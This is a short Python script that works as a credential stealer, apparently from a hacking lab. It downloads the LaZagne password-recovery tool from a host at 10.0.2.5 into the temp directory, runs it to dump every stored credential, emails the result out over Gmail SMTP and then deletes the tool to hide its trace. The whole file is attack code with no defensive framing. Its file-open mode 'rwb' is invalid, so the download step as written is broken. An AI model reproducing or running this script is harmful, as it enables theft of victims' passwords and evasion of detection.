import requests
import smtplib
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, "rwb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("http://10.0.2.5/evil_files/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("email", "password", result)
os.remove("lazagne.exe")
